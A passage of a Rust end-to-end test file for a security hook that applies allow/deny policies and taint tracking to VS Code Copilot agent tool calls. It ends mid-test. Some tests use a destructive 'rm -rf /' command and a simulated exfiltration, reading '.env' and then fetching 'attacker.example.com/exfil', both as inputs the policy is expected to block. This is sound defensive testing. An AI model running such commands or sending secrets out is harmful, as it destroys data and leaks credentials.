//! End-to-end tests for the VS Code Copilot sidebar agent hook format.
//!
//! These tests invoke the real `lilith-zero` binary with `--format vscode`
//! and exercise the full stack: JSON parsing → policy evaluation → hookSpecificOutput
//! serialization. No mocking — the binary, persistence layer, and policy engine
//! all run exactly as they would in a developer's VS Code session.
//!
//! # What is validated
//!
//! - **Output structure**: `hookSpecificOutput` wrapper, all required and forbidden
//!   fields, correct types, no extra fields on allow.
//! - **VS Code tool names**: `editFiles`, `createFile`, `readFile`, `searchFiles`,
//!   `runTerminalCommand`, `deleteFile`, `pushToGitHub`, `#fetch`, unknown tools.
//! - **Fail-closed invariants**: malformed JSON, empty stdin, no policy, unknown
//!   tool all produce deny — never accidental allow.
//! - **Exit code**: always 0 (VS Code reads JSON, not exit code).
//! - **Single-line output**: VS Code parses the first line only.
//! - **PostToolUse**: different structure from PreToolUse.
//! - **Non-tool events**: SessionStart, SessionEnd, UserPromptSubmit produce
//!   generic `hookSpecificOutput` with the correct `hookEventName`.
//! - **Taint persistence**: taints set in one PreToolUse call are visible in the
//!   next call with the same `sessionId` (VS Code provides a stable ID per session).
//! - **Session isolation**: taints from session A do not bleed into session B.
//! - **Canonicalization**: `tool_name` with special characters (`#fetch`),
//!   nested `tool_input` JSON, absent `tool_input`, deeply nested args.
//! - **Field types**: `permissionDecision` is a string, not a boolean.
//!
//! # Test naming
//! `test_vscode_{tool_or_scenario}_{expected_outcome}`
//!
//! # Running
//! ```bash
//! cargo test --test vscode_hook_tests
//! ```

#![cfg(not(miri))]

use assert_cmd::Command;
use serde_json::Value;
use std::io::Write;
use std::path::{Path, PathBuf};
use tempfile::NamedTempFile;

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------

fn bin() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_lilith-zero"))
}

fn write_policy(yaml: &str) -> NamedTempFile {
    let mut f = NamedTempFile::new().expect("temp policy");
    f.write_all(yaml.as_bytes()).expect("write policy");
    f
}

/// Parse stdout from the binary as JSON.
/// Panics with a useful message if the output is missing or malformed.
fn parse_output(raw: &[u8]) -> Value {
    let text = std::str::from_utf8(raw).expect("stdout must be UTF-8");
    let line = text
        .lines()
        .find(|l| !l.trim().is_empty())
        .unwrap_or_else(|| panic!("no output on stdout — binary wrote nothing\nfull: {text}"));
    serde_json::from_str(line)
        .unwrap_or_else(|e| panic!("stdout is not valid JSON: {e}\nline: {line}"))
}

/// Run `lilith-zero hook --format vscode` with the given payload and policy.
/// VS Code embeds the event name in the JSON, so no `--event` flag is needed.
fn run_vscode(payload: &str, policy: &Path) -> assert_cmd::assert::Assert {
    Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy)
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
}

/// Build a PreToolUse payload for the VS Code format.
fn pre_tool(session_id: &str, tool_name: &str, tool_input: Value) -> String {
    serde_json::json!({
        "timestamp": "2026-04-19T12:00:00.000Z",
        "cwd": "/workspace/my-project",
        "sessionId": session_id,
        "hookEventName": "PreToolUse",
        "transcript_path": "/tmp/transcript.json",
        "tool_name": tool_name,
        "tool_input": tool_input,
        "tool_use_id": format!("tu-{tool_name}-001")
    })
    .to_string()
}

/// Build a PostToolUse payload.
fn post_tool(session_id: &str, tool_name: &str, output: Value) -> String {
    serde_json::json!({
        "timestamp": "2026-04-19T12:00:01.000Z",
        "cwd": "/workspace/my-project",
        "sessionId": session_id,
        "hookEventName": "PostToolUse",
        "tool_name": tool_name,
        "tool_input": {},
        "tool_output": output,
        "tool_use_id": format!("tu-{tool_name}-001")
    })
    .to_string()
}

/// Build a non-tool lifecycle event payload.
fn lifecycle_event(session_id: &str, event: &str) -> String {
    serde_json::json!({
        "timestamp": "2026-04-19T12:00:00.000Z",
        "cwd": "/workspace/my-project",
        "sessionId": session_id,
        "hookEventName": event
    })
    .to_string()
}

/// Clean up any session file that might have been created during a test.
fn cleanup_session(session_id: &str) {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
    let path = PathBuf::from(home)
        .join(".lilith/sessions")
        .join(format!("{session_id}.json"));
    let _ = std::fs::remove_file(path);
}

// ---------------------------------------------------------------------------
// Policy fixtures
// ---------------------------------------------------------------------------

/// Standard VS Code policy with real tool names.
fn vscode_policy() -> &'static str {
    r##"
id: vscode-e2e-policy
customer_id: enterprise-test
name: VS Code E2E Test Policy
version: 1
static_rules:
  editFiles: ALLOW
  createFile: ALLOW
  readFile: ALLOW
  searchFiles: ALLOW
  "#fetch": ALLOW
  runTerminalCommand: DENY
  deleteFile: DENY
  pushToGitHub: DENY
taint_rules: []
resource_rules: []
"##
}

/// Policy for taint propagation tests.
fn taint_policy() -> &'static str {
    r##"
id: vscode-taint-policy
customer_id: test
name: VS Code Taint Test Policy
version: 1
static_rules:
  readFile: ALLOW
  "#fetch": ALLOW
  runTerminalCommand: ALLOW
taint_rules:
  - tool: readFile
    action: ADD_TAINT
    tag: SENSITIVE_READ
  - tool: "#fetch"
    action: CHECK_TAINT
    required_taints: ["SENSITIVE_READ"]
    error: "exfiltration blocked: session read sensitive data before network call"
resource_rules: []
"##
}

// ===========================================================================
// 1. OUTPUT STRUCTURE VALIDATION
// ===========================================================================

/// Every PreToolUse response must have the hookSpecificOutput wrapper.
#[test]
fn test_vscode_output_has_hook_specific_output_wrapper() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-struct-1",
        "editFiles",
        serde_json::json!({"files": ["a.rs"]}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert!(
        json.get("hookSpecificOutput").is_some(),
        "output must have top-level 'hookSpecificOutput' key, got: {json}"
    );
}

/// hookSpecificOutput.hookEventName must be "PreToolUse" for pre-tool events.
#[test]
fn test_vscode_output_hook_event_name_is_pre_tool_use() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool("s-struct-2", "editFiles", serde_json::json!({}));
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("PreToolUse"),
        "hookEventName must be 'PreToolUse'"
    );
}

/// permissionDecision must be a string, never a boolean.
#[test]
fn test_vscode_permission_decision_is_string_not_boolean() {
    let policy = write_policy(vscode_policy());
    for tool in &["editFiles", "runTerminalCommand"] {
        let payload = pre_tool("s-type-1", tool, serde_json::json!({}));
        let out = run_vscode(&payload, policy.path())
            .success()
            .get_output()
            .stdout
            .clone();
        let json = parse_output(&out);
        let decision = &json["hookSpecificOutput"]["permissionDecision"];
        assert!(
            decision.is_string(),
            "permissionDecision must be a string (not bool/number), got: {decision} for tool {tool}"
        );
    }
}

/// Allow response must NOT contain permissionDecisionReason or additionalContext.
#[test]
fn test_vscode_allow_has_no_extra_fields() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-allow-1",
        "editFiles",
        serde_json::json!({"files": ["x.rs"]}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    let specific = &json["hookSpecificOutput"];
    assert!(
        specific.get("permissionDecisionReason").is_none(),
        "allow must NOT include permissionDecisionReason, got: {json}"
    );
    assert!(
        specific.get("additionalContext").is_none(),
        "allow must NOT include additionalContext, got: {json}"
    );
}

/// Deny response MUST include permissionDecisionReason and additionalContext.
#[test]
fn test_vscode_deny_has_required_fields() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-deny-1",
        "runTerminalCommand",
        serde_json::json!({"command": "ls"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    let specific = &json["hookSpecificOutput"];

    let reason = specific["permissionDecisionReason"].as_str();
    assert!(
        reason.is_some() && !reason.unwrap().is_empty(),
        "deny must include non-empty permissionDecisionReason, got: {json}"
    );
    let context = specific["additionalContext"].as_str();
    assert!(
        context.is_some() && !context.unwrap().is_empty(),
        "deny must include non-empty additionalContext (shown to the LLM), got: {json}"
    );
}

/// Output must be exactly one non-empty line — VS Code parses the first line only.
#[test]
fn test_vscode_output_is_single_line() {
    let policy = write_policy(vscode_policy());
    for (tool, desc) in &[("editFiles", "allow"), ("runTerminalCommand", "deny")] {
        let payload = pre_tool("s-line-1", tool, serde_json::json!({}));
        let out = run_vscode(&payload, policy.path())
            .success()
            .get_output()
            .stdout
            .clone();
        let text = std::str::from_utf8(&out).unwrap();
        let non_empty: Vec<&str> = text.lines().filter(|l| !l.trim().is_empty()).collect();
        assert_eq!(
            non_empty.len(),
            1,
            "stdout must have exactly 1 non-empty line for {desc} ({tool}), got {}: {:?}",
            non_empty.len(),
            non_empty
        );
    }
}

/// Exit code must always be 0 — VS Code reads JSON stdout, never exit codes.
#[test]
fn test_vscode_exit_code_always_zero_on_deny() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-exit-1",
        "runTerminalCommand",
        serde_json::json!({"command": "whoami"}),
    );
    run_vscode(&payload, policy.path()).success(); // assert_cmd: success() = exit 0
}

#[test]
fn test_vscode_exit_code_always_zero_on_allow() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-exit-2",
        "editFiles",
        serde_json::json!({"files": ["lib.rs"]}),
    );
    run_vscode(&payload, policy.path()).success();
}

// ===========================================================================
// 2. VS CODE TOOL NAMES — ALLOW / DENY PER POLICY
// ===========================================================================

#[test]
fn test_vscode_edit_files_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-edit-1",
        "editFiles",
        serde_json::json!({"files": ["src/main.rs"], "edits": [{"range": {"start": {"line": 1}}, "newText": "fn main() {}"}]}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "editFiles must be allowed"
    );
}

#[test]
fn test_vscode_create_file_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-create-1",
        "createFile",
        serde_json::json!({"path": "src/new_module.rs", "content": "pub fn hello() {}"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "createFile must be allowed"
    );
}

#[test]
fn test_vscode_read_file_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-read-1",
        "readFile",
        serde_json::json!({"path": "src/main.rs"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "readFile must be allowed"
    );
}

#[test]
fn test_vscode_search_files_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-search-1",
        "searchFiles",
        serde_json::json!({"query": "TODO", "include": "**/*.rs"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "searchFiles must be allowed"
    );
}

/// #fetch (web fetch) contains a hash in the tool name — must be handled without panic.
#[test]
fn test_vscode_fetch_tool_with_hash_in_name_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-fetch-1",
        "#fetch",
        serde_json::json!({"url": "https://api.example.com/data", "method": "GET"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "#fetch must be allowed"
    );
}

#[test]
fn test_vscode_run_terminal_command_denied() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-term-1",
        "runTerminalCommand",
        serde_json::json!({"command": "echo hello"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "runTerminalCommand must be denied"
    );
}

#[test]
fn test_vscode_run_terminal_dangerous_command_denied() {
    let policy = write_policy(vscode_policy());
    // rm -rf / — must be denied before execution
    let payload = pre_tool(
        "t-term-2",
        "runTerminalCommand",
        serde_json::json!({"command": "rm -rf /", "cwd": "/"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "rm -rf / must be denied"
    );
}

#[test]
fn test_vscode_delete_file_denied() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-del-1",
        "deleteFile",
        serde_json::json!({"path": "src/important.rs"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "deleteFile must be denied"
    );
}

#[test]
fn test_vscode_push_to_github_denied() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-push-1",
        "pushToGitHub",
        serde_json::json!({"branch": "main", "message": "feat: add feature"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "pushToGitHub must be denied"
    );
}

// ===========================================================================
// 3. FAIL-CLOSED INVARIANTS
// ===========================================================================

/// Malformed JSON on stdin must deny — never accidentally allow on parse failure.
#[test]
fn test_vscode_malformed_json_fails_closed() {
    let policy = write_policy(vscode_policy());
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(b"{ this is not valid json !!!".to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "malformed JSON must fail-closed with deny"
    );
}

/// Empty stdin must deny — never accidentally allow when no payload arrives.
#[test]
fn test_vscode_empty_stdin_fails_closed() {
    let policy = write_policy(vscode_policy());
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(b"".to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "empty stdin must fail-closed with deny"
    );
}

/// Whitespace-only stdin must also deny.
#[test]
fn test_vscode_whitespace_only_stdin_fails_closed() {
    let policy = write_policy(vscode_policy());
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(b"   \n\t  \n".to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "whitespace-only stdin must fail-closed with deny"
    );
}

/// No policy loaded → deny all (fail-closed BlockParams mode).
#[test]
fn test_vscode_no_policy_denies_all_tools_fail_closed() {
    // No --policy flag — engine runs with no policy, must deny everything
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode"])
        .write_stdin(
            pre_tool("s-nopol-1", "editFiles", serde_json::json!({}))
                .as_bytes()
                .to_vec(),
        )
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "no policy must deny all tools (fail-closed)"
    );
}

/// Tool not in policy → deny (fail-closed, deny-by-default).
#[test]
fn test_vscode_unknown_tool_denied_fail_closed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-unk-1",
        "someUnknownFutureTool",
        serde_json::json!({"arg": "value"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "tool not in policy must be denied (fail-closed)"
    );
}

/// Valid JSON but missing required `sessionId` field — must fail-closed.
#[test]
fn test_vscode_missing_session_id_fails_closed() {
    let policy = write_policy(vscode_policy());
    // No sessionId field
    let payload = r#"{"cwd":"/workspace","hookEventName":"PreToolUse","tool_name":"editFiles","tool_input":{}}"#;
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    // Missing sessionId means deserialization fails → deny
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "missing sessionId must fail-closed"
    );
}

// ===========================================================================
// 4. POST-TOOL-USE OUTPUT STRUCTURE
// ===========================================================================

/// PostToolUse output must use hookEventName "PostToolUse" in the wrapper.
#[test]
fn test_vscode_post_tool_use_output_structure() {
    let policy = write_policy(vscode_policy());
    let payload = post_tool(
        "s-post-1",
        "editFiles",
        serde_json::json!({"status": "success", "linesChanged": 5}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("PostToolUse"),
        "PostToolUse response must echo 'PostToolUse' in hookEventName"
    );
    // PostToolUse allow must NOT have a "decision" field
    assert!(
        json.get("decision").is_none(),
        "PostToolUse allow must not include 'decision' field, got: {json}"
    );
}

/// PostToolUse exit code must also be 0.
#[test]
fn test_vscode_post_tool_use_exits_zero() {
    let policy = write_policy(vscode_policy());
    let payload = post_tool(
        "s-post-2",
        "runTerminalCommand",
        serde_json::json!({"output": "hello"}),
    );
    run_vscode(&payload, policy.path()).success();
}

/// PostToolUse for a denied tool still runs (for taint propagation) and returns allow.
#[test]
fn test_vscode_post_tool_use_for_denied_tool_returns_allow_structure() {
    let policy = write_policy(vscode_policy());
    // PostToolUse fires after the tool ran; even for "denied" tools in the policy,
    // PostToolUse output is informational and always returns allow structure.
    let payload = post_tool(
        "s-post-3",
        "runTerminalCommand",
        serde_json::json!({"stdout": "hello world"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("PostToolUse"),
        "PostToolUse must have correct hookEventName"
    );
}

// ===========================================================================
// 5. LIFECYCLE EVENTS (SessionStart, SessionEnd, UserPromptSubmit)
// ===========================================================================

/// SessionStart must produce a generic hookSpecificOutput with hookEventName="SessionStart".
#[test]
fn test_vscode_session_start_produces_correct_output() {
    let policy = write_policy(vscode_policy());
    let payload = lifecycle_event("s-sess-1", "SessionStart");
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("SessionStart"),
        "SessionStart must echo hookEventName in output"
    );
}

#[test]
fn test_vscode_session_end_produces_correct_output() {
    let policy = write_policy(vscode_policy());
    let payload = lifecycle_event("s-sess-2", "SessionEnd");
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("SessionEnd")
    );
}

#[test]
fn test_vscode_user_prompt_submit_produces_correct_output() {
    let policy = write_policy(vscode_policy());
    let payload = lifecycle_event("s-prompt-1", "UserPromptSubmit");
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("UserPromptSubmit")
    );
}

// ===========================================================================
// 6. SESSION IDENTITY — sessionId from payload (not derived from cwd)
// ===========================================================================

/// VS Code provides sessionId directly. Two calls with the same sessionId must
/// share state. Two different sessionIds must be isolated.
#[test]
fn test_vscode_session_id_used_directly_from_payload() {
    // The session ID must come from the payload's `sessionId` field,
    // not derived from `cwd`. Verify by using two distinct sessionIds
    // pointing to the same cwd — they must have independent taint state.
    let session_a = "vsc-shard-a-e2e-001";
    let session_b = "vsc-shard-b-e2e-001";
    cleanup_session(session_a);
    cleanup_session(session_b);

    let policy_yaml = r#"
id: session-id-test
customer_id: test
name: Session ID Test
version: 1
static_rules:
  taint_tool: ALLOW
  check_tool: ALLOW
taint_rules:
  - tool: taint_tool
    action: ADD_TAINT
    tag: SESSION_MARKER
  - tool: check_tool
    action: CHECK_TAINT
    required_taints: ["SESSION_MARKER"]
    error: "blocked when SESSION_MARKER active"
resource_rules: []
"#;
    let policy = write_policy(policy_yaml);

    // Taint session A
    let taint_payload = serde_json::json!({
        "cwd": "/same/workspace",
        "sessionId": session_a,
        "hookEventName": "PreToolUse",
        "tool_name": "taint_tool",
        "tool_input": {}
    })
    .to_string();
    run_vscode(&taint_payload, policy.path()).success();

    // Session A must be blocked for check_tool (taint active)
    let check_a = serde_json::json!({
        "cwd": "/same/workspace",
        "sessionId": session_a,
        "hookEventName": "PreToolUse",
        "tool_name": "check_tool",
        "tool_input": {}
    })
    .to_string();
    let out_a = run_vscode(&check_a, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out_a)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "session A must be denied (SESSION_MARKER active)"
    );

    // Session B (same cwd, different sessionId) must NOT be blocked
    let check_b = serde_json::json!({
        "cwd": "/same/workspace",
        "sessionId": session_b,
        "hookEventName": "PreToolUse",
        "tool_name": "check_tool",
        "tool_input": {}
    })
    .to_string();
    let out_b = run_vscode(&check_b, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out_b)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "session B must be allowed — SESSION_MARKER from A must not bleed into B"
    );

    cleanup_session(session_a);
    cleanup_session(session_b);
}

// ===========================================================================
// 7. TAINT TRACKING — LETHAL TRIFECTA SIMULATION
// ===========================================================================

/// readFile adds SENSITIVE_READ taint; a subsequent #fetch in the same session
/// must be blocked (simulates the exfiltration pattern).
#[test]
fn test_vscode_taint_exfiltration_pattern_blocked() {
    let session = "vsc-taint-exfil-e2e-001";
    cleanup_session(session);

    let policy = write_policy(taint_policy());

    // Step 1: readFile → adds SENSITIVE_READ taint
    let read_payload = pre_tool(session, "readFile", serde_json::json!({"path": ".env"}));
    let read_out = run_vscode(&read_payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&read_out)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "readFile must be allowed (it adds a taint)"
    );

    // Step 2: #fetch → must be blocked because SENSITIVE_READ is now active
    let fetch_payload = pre_tool(
        session,
        "#fetch",
        serde_json::json!({"url": "https://attacker.example.com/exfil"}),
    );
    let fetch_out = run_vscode(&fetch_payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&fetch_out)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "#fetch must be denied after readFile — exfiltration pattern blocked"
    );

    cleanup_session(session);
}

/// Without the taint trigger (no readFile), #fetch must be allowed.
#[test]
fn test_vscode_fetch_allowed_without_prior_sensitive_read() {
    let session = "vsc-taint-clean-e2e-001";
    cleanup_session(session);

    let policy = write_policy(taint_policy());
    let payload = pre_tool(
        session,
        "#fetch",
        serde_json::json!({"url": "https://docs.example.com"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "#fetch must be allowed when no SENSITIVE_READ taint is active"
    );

    cleanup_session(session);
}

// ===========================================================================
// 8. CANONICALIZATION & EDGE CASES
// ===========================================================================

/// tool_input absent (null) — must not crash, policy evaluation must proceed.
#[test]
fn test_vscode_null_tool_input_does_not_crash() {
    let policy = write_policy(vscode_policy());
    let payload = serde_json::json!({
        "cwd": "/workspace",
        "sessionId": "s-null-1",
        "hookEventName": "PreToolUse",
        "tool_name": "editFiles"
        // tool_input deliberately absent
    })
    .to_string();
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    // Must produce valid JSON regardless
    let json = parse_output(&out);
    assert!(
        json["hookSpecificOutput"]["permissionDecision"]
            .as_str()
            .is_some(),
        "must produce a permissionDecision even with absent tool_input"
    );
}

/// Deeply nested tool_input — must parse and evaluate correctly without truncation.
#[test]
fn test_vscode_deeply_nested_tool_input_handled() {
    let policy = write_policy(vscode_policy());
    let nested = serde_json::json!({
        "files": ["a.rs", "b.rs"],
        "edits": [
            {"range": {"start": {"line": 1, "character": 0}, "end": {"line": 5, "character": 80}}, "newText": "fn main() {}\n"},
            {"range": {"start": {"line": 10, "character": 0}, "end": {"line": 15, "character": 0}}, "newText": "// comment\n"}
        ],
        "metadata": {"author": "copilot", "reason": "refactor", "tags": ["safe", "reviewed"]}
    });
    let payload = pre_tool("s-nested-1", "editFiles", nested);
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "editFiles with deeply nested input must be allowed"
    );
}

/// Empty string tool_name — must not crash, must fail-closed (not in policy).
#[test]
fn test_vscode_empty_tool_name_fails_closed() {
    let policy = write_policy(vscode_policy());
    let payload = serde_json::json!({
        "cwd": "/workspace",
        "sessionId": "s-empty-tool-1",
        "hookEventName": "PreToolUse",
        "tool_name": "",
        "tool_input": {}
    })
    .to_string();
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "empty tool_name not in policy must be denied (fail-closed)"
    );
}

/// tool_name with dots (e.g. MCP tools like `github.create_issue`) must parse correctly.
#[test]
fn test_vscode_mcp_style_dotted_tool_name_evaluated() {
    // MCP tools often use dotted namespacing: "server.tool_name"
    let policy_yaml = r#"
id: mcp-tool-test
customer_id: test
name: MCP Tool Test
version: 1
static_rules:
  "github.create_issue": ALLOW
  "github.delete_repo": DENY
taint_rules: []
resource_rules: []
"#;
    let policy = write_policy(policy_yaml);

    let allow_payload = pre_tool(
        "s-mcp-1",
        "github.create_issue",
        serde_json::json!({"title": "Bug", "body": "Found a bug"}),
    );
    let out_allow = run_vscode(&allow_payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out_allow)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "github.create_issue must be allowed"
    );

    let deny_payload = pre_tool(
        "s-mcp-1",
        "github.delete_repo",
        serde_json::json!({"repo": "my-org/critical-repo"}),
    );
    let out_deny = run_vscode(&deny_payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out_deny)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "github.delete_repo must be denied"
    );
}

/// transcript_path and tool_use_id fields in the payload must be accepted
/// without affecting the security decision.
#[test]
fn test_vscode_extra_fields_transcript_and_tool_use_id_accepted() {
    let policy = write_policy(vscode_policy());
    let payload = serde_json::json!({
        "timestamp": "2026-04-19T12:00:00.000Z",
        "cwd": "/workspace",
        "sessionId": "s-extra-1",
        "hookEventName": "PreToolUse",
        "transcript_path": "/tmp/.copilot/session-abc.json",
        "tool_name": "editFiles",
        "tool_input": {"files": ["main.rs"]},
        "tool_use_id": "tu-abc-xyz-999",
        "unknownFutureField": "should be ignored gracefully"
    })
    .to_string();
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "extra/unknown fields must be tolerated without affecting the decision"
    );
}

// ===========================================================================
// 9. OUTPUT IS VALID JSON IN ALL ERROR PATHS
// ===========================================================================

/// Every code path must produce valid JSON — even the internal error fallback.
#[test]
fn test_vscode_output_is_valid_json_on_allow() {
    let policy = write_policy(vscode_policy());
    let out = run_vscode(
        &pre_tool("s-valid-1", "editFiles", serde_json::json!({})),
        policy.path(),
    )
    .success()
    .get_output()
    .stdout
    .clone();
    let _ = parse_output(&out); // panics if invalid
}

#[test]
fn test_vscode_output_is_valid_json_on_deny() {
    let policy = write_policy(vscode_policy());
    let out = run_vscode(
        &pre_tool("s-valid-2", "runTerminalCommand", serde_json::json!({})),
        policy.path(),
    )
    .success()
    .get_output()
    .stdout
    .clone();
    let _ = parse_output(&out);
}

#[test]
fn test_vscode_output_is_valid_json_on_malformed_input() {
    let policy = write_policy(vscode_policy());
    let out = Command::new(bin())
